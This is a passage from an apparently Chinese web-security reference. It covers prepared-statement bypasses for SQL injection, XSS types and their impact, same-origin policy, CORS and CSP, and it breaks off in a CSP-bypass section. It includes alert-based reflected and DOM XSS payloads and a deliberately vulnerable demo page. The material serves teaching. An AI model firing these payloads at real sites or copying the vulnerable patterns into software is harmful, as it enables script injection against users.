<p>SQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>
</div>
<div class="section" id="id3">
<h5>模拟预编译<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>
</div>
<div class="section" id="id4">
<h5>绕过<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<div class="section" id="id5">
<h6>预编译使用错误<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
</div>
<div class="section" id="id6">
<h6>部分参数不可预编译<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h6>
<p>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
</div>
<div class="section" id="id7">
<h6>预编译实现错误<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<p>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
</div>
</div>
</div>
<span id="document-vuln/sql/ref"></span><div class="section" id="id1">
<h4>参考文章<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="tricks">
<h5>Tricks<a class="headerlink" href="#tricks" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://blog.wils0n.cn/archives/178/">sqlmap time based inject 分析</a></li>
<li><a class="reference external" href="https://github.com/NetSPI/SQLInjectionWiki">SQLInjectionWiki</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/BucCNyCmyATdRENZp0AF2A">常见数据库写入Webshell汇总</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg">MSSQL数据库攻击实战指北</a></li>
</ul>
</div>
<div class="section" id="bypass">
<h5>Bypass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg">SQL注入ByPass的一些小技巧</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/368">Waf Bypass之道</a></li>
<li><a class="reference external" href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI">MySQL Bypass Wiki</a></li>
</ul>
</div>
<div class="section" id="nosql">
<h5>NoSQL<a class="headerlink" href="#nosql" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://www.yunweipai.com/archives/14084.html">NoSQL注入的分析和缓解</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/tG874LNTIdiN7MPtO-hovA">NoSQL注入</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-vuln/xss/index"></span><div class="section" id="xss">
<h3>XSS<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-vuln/xss/classify"></span><div class="section" id="id1">
<h4>分类<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。</p>
</div>
<div class="section" id="xss">
<h5>反射型XSS<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h5>
<p>反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：<code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">echo</span> <span class="pre">&quot;&lt;p&gt;hello,</span> <span class="pre">$_GET['user']&lt;/p&gt;&quot;;?&gt;</span></code> ，那么在访问时设置 <code class="docutils literal notranslate"><span class="pre">/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;</span></code> ，则可执行预设好的JavaScript代码。</p>
<p>反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。</p>
</div>
<div class="section" id="id3">
<h5>储存型XSS<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p>
</div>
<div class="section" id="dom-xss">
<h5>DOM XSS<a class="headerlink" href="#dom-xss" title="永久链接至标题">¶</a></h5>
<p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。</p>
<p>例如</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">DOM</span> <span class="n">Based</span> <span class="n">XSS</span> <span class="n">Demo</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
<span class="n">function</span> <span class="n">xsstest</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">var</span> <span class="nb">str</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s2">&quot;input&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
    <span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s2">&quot;output&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;&lt;img src=&#39;&quot;</span><span class="o">+</span><span class="nb">str</span><span class="o">+</span><span class="s2">&quot;&#39;&gt;&lt;/img&gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">div</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;output&quot;</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;input&quot;</span> <span class="n">size</span><span class="o">=</span><span class="mi">50</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;button&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">onclick</span><span class="o">=</span><span class="s2">&quot;xsstest()&quot;</span> <span class="o">/&gt;</span>
<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>输入 <code class="docutils literal notranslate"><span class="pre">x'</span> <span class="pre">onerror='javascript:alert(/xss/)</span></code> 即可触发。</p>
</div>
<div class="section" id="blind-xss">
<h5>Blind XSS<a class="headerlink" href="#blind-xss" title="永久链接至标题">¶</a></h5>
<p>Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。</p>
</div>
</div>
<span id="document-vuln/xss/harm"></span><div class="section" id="id1">
<h4>危害<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>存在XSS漏洞时，可能会导致以下几种情况：</p>
<ol class="arabic simple">
<li>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</li>
<li>攻击者能够在一定限度内记录用户的键盘输入。</li>
<li>攻击者通过CSRF等方式以用户身份执行危险操作。</li>
<li>XSS蠕虫。</li>
<li>获取用户浏览器信息。</li>
<li>利用XSS漏洞扫描用户内网。</li>
</ol>
</div>
<span id="document-vuln/xss/sop"></span><div class="section" id="id1">
<h4>同源策略<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。
是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p>
<div class="section" id="file">
<h6>file域的同源策略<a class="headerlink" href="#file" title="永久链接至标题">¶</a></h6>
<p>在之前的浏览器中，任意两个file域的URI被认为是同源的。本地磁盘上的任何HTML文件都可以读取本地磁盘上的任何其他文件。</p>
<p>从Gecko 1.9开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p>
</div>
<div class="section" id="cookie">
<h6>cookie的同源策略<a class="headerlink" href="#cookie" title="永久链接至标题">¶</a></h6>
<p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。</p>
<p>不管使用哪个协议(HTTP/HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 <code class="docutils literal notranslate"><span class="pre">domain</span></code> / <code class="docutils literal notranslate"><span class="pre">path</span></code> / <code class="docutils literal notranslate"><span class="pre">secure</span></code> 和 <code class="docutils literal notranslate"><span class="pre">http-only</span></code> 标记来限定其访问性。</p>
<p>所以 <code class="docutils literal notranslate"><span class="pre">https://localhost:8080/</span></code> 和 <code class="docutils literal notranslate"><span class="pre">http://localhost:8081/</span></code> 的Cookie是共享的。</p>
</div>
<div class="section" id="flash-silverlight">
<h6>Flash/SilverLight跨域<a class="headerlink" href="#flash-silverlight" title="永久链接至标题">¶</a></h6>
<p>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。</p>
<p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p>
</div>
</div>
<div class="section" id="id3">
<h5>源的更改<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>同源策略认为域和子域属于不同的域，例如 <code class="docutils literal notranslate"><span class="pre">child1.a.com</span></code> 与 <code class="docutils literal notranslate"><span class="pre">a.com</span></code> / <code class="docutils literal notranslate"><span class="pre">child1.a.com</span></code> 与 <code class="docutils literal notranslate"><span class="pre">child2.a.com</span></code> / <code class="docutils literal notranslate"><span class="pre">xxx.child1.a.com</span></code> 与 <code class="docutils literal notranslate"><span class="pre">child1.a.com</span></code> 两两不同源。</p>
<p>对于这种情况，可以在两个方面各自设置 <code class="docutils literal notranslate"><span class="pre">document.domain='a.com'</span></code> 来改变其源来实现以上任意两个页面之间的通信。</p>
<p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 <code class="docutils literal notranslate"><span class="pre">null</span></code> 。</p>
</div>
<div class="section" id="id4">
<h5>跨源访问<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>通常允许跨域写操作(Cross-origin writes)</dt>
<dd><ul class="first last">
<li>链接(links)</li>
<li>重定向</li>
<li>表单提交</li>
</ul>
</dd>
</dl>
</li>
<li>通常允许跨域资源嵌入(Cross-origin embedding)</li>
<li>通常不允许跨域读操作(Cross-origin reads)</li>
</ul>
<p>可能嵌入跨源的资源的一些示例有：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;script</span> <span class="pre">src=&quot;...&quot;&gt;&lt;/script&gt;</span></code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;link</span> <span class="pre">rel=&quot;stylesheet&quot;</span> <span class="pre">href=&quot;...&quot;&gt;</span></code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;img&gt;</span></code> / <code class="docutils literal notranslate"><span class="pre">&lt;video&gt;</span></code> / <code class="docutils literal notranslate"><span class="pre">&lt;audio&gt;</span></code> 嵌入多媒体资源。</li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;object&gt;</span></code> <code class="docutils literal notranslate"><span class="pre">&lt;embed&gt;</span></code> 和 <code class="docutils literal notranslate"><span class="pre">&lt;applet&gt;</span></code> 的插件。</li>
<li><code class="docutils literal notranslate"><span class="pre">&#64;font-face</span></code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;frame&gt;</span></code> 和 <code class="docutils literal notranslate"><span class="pre">&lt;iframe&gt;</span></code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
</ul>
<div class="section" id="jsonp">
<h6>JSONP跨域<a class="headerlink" href="#jsonp" title="永久链接至标题">¶</a></h6>
<p>JSONP就是利用 <code class="docutils literal notranslate"><span class="pre">&lt;script&gt;</span></code> 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。</p>
<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。</p>
<p>JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
<p>另外JSONP在没有设置callback函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为SOME攻击。</p>
</div>
<div class="section" id="api">
<h6>跨源脚本API访问<a class="headerlink" href="#api" title="永久链接至标题">¶</a></h6>
<p>Javascript的APIs中，如 <code class="docutils literal notranslate"><span class="pre">iframe.contentWindow</span></code> , <code class="docutils literal notranslate"><span class="pre">window.parent</span></code>, <code class="docutils literal notranslate"><span class="pre">window.open</span></code> 和 <code class="docutils literal notranslate"><span class="pre">window.opener</span></code> 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 <code class="docutils literal notranslate"><span class="pre">window</span></code> 和 <code class="docutils literal notranslate"><span class="pre">location</span></code> 对象的访问添加限制。</p>
<p><code class="docutils literal notranslate"><span class="pre">window</span></code> 允许跨源访问的方法有</p>
<ul class="simple">
<li>window.blur</li>
<li>window.close</li>
<li>window.focus</li>
<li>window.postMessage</li>
</ul>
<p><code class="docutils literal notranslate"><span class="pre">window</span></code> 允许跨源访问的属性有</p>
<ul class="simple">
<li>window.closed</li>
<li>window.frames</li>
<li>window.length</li>
<li>window.location</li>
<li>window.opener</li>
<li>window.parent</li>
<li>window.self</li>
<li>window.top</li>
<li>window.window</li>
</ul>
<p>其中 <code class="docutils literal notranslate"><span class="pre">window.location</span></code> 允许读/写，其他的属性只允许读</p>
</div>
<div class="section" id="id5">
<h6>跨源数据存储访问<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>存储在浏览器中的数据，如 <code class="docutils literal notranslate"><span class="pre">localStorage</span></code> 和 <code class="docutils literal notranslate"><span class="pre">IndexedDB</span></code>，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。</p>
</div>
</div>
<div class="section" id="cors">
<h5>CORS<a class="headerlink" href="#cors" title="永久链接至标题">¶</a></h5>
<p>CORS是一个W3C标准，全称是跨域资源共享(Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p>
<div class="section" id="id6">
<h6>常见请求头<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>Origin</dt>
<dd><ul class="first last">
<li>预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段</li>
<li><code class="docutils literal notranslate"><span class="pre">Origin:</span> <span class="pre">&lt;origin&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Request-Method</dt>
<dd><ul class="first last">
<li>声明请求使用的方法</li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Request-Method:</span> <span class="pre">&lt;method&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Request-Headers</dt>
<dd><ul class="first last">
<li>声明请求使用的header字段</li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Request-Headers:</span> <span class="pre">&lt;field-name&gt;[,</span> <span class="pre">&lt;field-name&gt;]*</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id7">
<h6>常见返回头<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>Access-Control-Allow-Origin</dt>
<dd><ul class="first last">
<li>声明允许访问的源外域URI</li>
<li>对于携带身份凭证的请求不可使用通配符 <code class="docutils literal notranslate"><span class="pre">*</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Origin:</span> <span class="pre">&lt;origin&gt;</span> <span class="pre">|</span> <span class="pre">*</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Expose-Headers</dt>
<dd><ul class="first last">
<li>声明允许暴露的头</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">Access-Control-Expose-Headers:</span> <span class="pre">X-My-Custom-Header,</span> <span class="pre">X-Another-Custom-Header</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Max-Age</dt>
<dd><ul class="first last">
<li>声明Cache时间</li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Max-Age:</span> <span class="pre">&lt;delta-seconds&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Allow-Credentials</dt>
<dd><ul class="first last">
<li>声明是否允许在请求中带入</li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Credentials:</span> <span class="pre">true</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Allow-Methods</dt>
<dd><ul class="first last">
<li>声明允许的访问方式</li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Methods:</span> <span class="pre">&lt;method&gt;[,</span> <span class="pre">&lt;method&gt;]*</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Access-Control-Allow-Headers</dt>
<dd><ul class="first last">
<li>声明允许的头</li>
<li><code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Headers:</span> <span class="pre">&lt;field-name&gt;[,</span> <span class="pre">&lt;field-name&gt;]*</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id8">
<h6>防御建议<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>如非必要不开启CORS</li>
<li>定义详细的白名单，不使用通配符，仅配置所需要的头</li>
<li>配置 <code class="docutils literal notranslate"><span class="pre">Vary:</span> <span class="pre">Origin</span></code> 头部</li>
<li>如非必要不使用 <code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Credentials</span></code></li>
<li>限制缓存的时间</li>
</ul>
</div>
</div>
<div class="section" id="id9">
<h5>阻止跨源访问<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>阻止跨域写操作，可以检测请求中的 <code class="docutils literal notranslate"><span class="pre">CSRF</span> <span class="pre">token</span></code> ，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。</p>
<p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 <code class="docutils literal notranslate"><span class="pre">Content-Type</span></code> 消息头。例如如果在HTML文档中指定 <code class="docutils literal notranslate"><span class="pre">&lt;script&gt;</span></code> 标记，则浏览器会尝试将HTML解析为JavaScript。</p>
</div>
</div>
<span id="document-vuln/xss/csp"></span><div class="section" id="csp">
<h4>CSP<a class="headerlink" href="#csp" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>CSP是什么？<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>
</div>
<div class="section" id="id2">
<h5>配置<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>CSP策略可以通过 HTTP 头信息或者 meta 元素定义。</p>
<p>CSP 有三类：</p>
<ul class="simple">
<li>Content-Security-Policy  (Google Chrome)</li>
<li>X-Content-Security-Policy (Firefox)</li>
<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span> <span class="n">header</span> <span class="p">:</span>
<span class="s2">&quot;Content-Security-Policy:&quot;</span> <span class="n">策略</span>
<span class="s2">&quot;Content-Security-Policy-Report-Only:&quot;</span> <span class="n">策略</span>
</pre></div>
</div>
<p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p>
<p>HTML Meta :</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">&quot;content-security-policy&quot;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&quot;策略&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">&quot;content-security-policy-report-only&quot;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&quot;策略&quot;</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="section" id="id3">
<h6>指令说明<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<table border="1" class="docutils">
<colgroup>
<col width="19%" />
<col width="81%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">指令</th>
<th class="head">说明</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>default-src</td>
<td>定义资源默认加载策略</td>
</tr>
<tr class="row-odd"><td>connect-src</td>
<td>定义 Ajax、WebSocket 等加载策略</td>
</tr>
<tr class="row-even"><td>font-src</td>
<td>定义 Font 加载策略</td>
</tr>
<tr class="row-odd"><td>frame-src</td>
<td>定义 Frame 加载策略</td>
</tr>
<tr class="row-even"><td>img-src</td>
<td>定义图片加载策略</td>
</tr>
<tr class="row-odd"><td>media-src</td>
<td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td>
</tr>
<tr class="row-even"><td>object-src</td>
<td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td>
</tr>
<tr class="row-odd"><td>script-src</td>
<td>定义 JS 加载策略</td>
</tr>
<tr class="row-even"><td>style-src</td>
<td>定义 CSS 加载策略</td>
</tr>
<tr class="row-odd"><td>base-uri</td>
<td>定义 &lt;base&gt; 根URL策略，不使用default-src作为默认值</td>
</tr>
<tr class="row-even"><td>sandbox</td>
<td>值为 allow-forms，对资源启用 sandbox</td>
</tr>
<tr class="row-odd"><td>report-uri</td>
<td>值为 /report-uri，提交日志</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id4">
<h6>关键字<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">-</span></code></dt>
<dd><ul class="first last">
<li>允许从任意url加载，除了 <code class="docutils literal notranslate"><span class="pre">data:</span></code> <code class="docutils literal notranslate"><span class="pre">blob:</span></code> <code class="docutils literal notranslate"><span class="pre">filesystem:</span></code> <code class="docutils literal notranslate"><span class="pre">schemes</span></code></li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">-</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">none</span></code></dt>
<dd><ul class="first last">
<li>禁止从任何url加载资源</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">object-src</span> <span class="pre">'none'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">self</span></code></dt>
<dd><ul class="first last">
<li>只可以加载同源资源</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">'self'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">data:</span></code></dt>
<dd><ul class="first last">
<li>可以通过data协议加载资源</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">'self'</span> <span class="pre">data:</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">domain.example.com</span></code></dt>
<dd><ul class="first last">
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">domain.example.com</span></code></li>
<li>只可以从特定的域加载资源</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">\*.example.com</span></code></dt>
<dd><ul class="first last">
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">\*.example.com</span></code></li>
<li>可以从任意example.com的子域处加载资源</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">https://cdn.com</span></code></dt>
<dd><ul class="first last">
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">https://cdn.com</span></code></li>
<li>只能从给定的域用https加载资源</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">https:</span></code></dt>
<dd><ul class="first last">
<li>e.g. <code class="docutils literal notranslate"><span class="pre">img-src</span> <span class="pre">https:</span></code></li>
<li>只能从任意域用https加载资源</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">unsafe-inline</span></code></dt>
<dd><ul class="first last">
<li>允许内部资源执行代码例如style attribute,onclick或者是sicript标签</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">script-src</span> <span class="pre">'unsafe-inline'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">unsafe-eval</span></code></dt>
<dd><ul class="first last">
<li>允许一些不安全的代码执行方式，例如js的eval()</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">script-src</span> <span class="pre">'unsafe-eval'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">nonce-&lt;base64-value&gt;'</span></code></dt>
<dd><ul class="first last">
<li>使用随机的nonce，允许加载标签上nonce属性匹配的标签</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">script-src</span> <span class="pre">'nonce-bm9uY2U='</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">&lt;hash-algo&gt;-&lt;base64-value&gt;'</span></code></dt>
<dd><ul class="first last">
<li>允许hash值匹配的代码块被执行</li>
<li>e.g. <code class="docutils literal notranslate"><span class="pre">script-src</span> <span class="pre">'sha256-&lt;base64-value&gt;'</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h6>配置范例<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>允许执行内联 JS 代码，但不允许加载外部资源</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Content</span><span class="o">-</span><span class="n">Security</span><span class="o">-</span><span class="n">Policy</span><span class="p">:</span> <span class="n">default</span><span class="o">-</span><span class="n">src</span> <span class="s1">&#39;self&#39;</span><span class="p">;</span> <span class="n">script</span><span class="o">-</span><span class="n">src</span> <span class="s1">&#39;self&#39;</span> <span class="s1">&#39;unsafe-inline&#39;</span><span class="p">;</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="bypass">
<h5>Bypass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<div class="section" id="id6">
<h6>预加载<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h6>
<p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。</p>
<p>HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>
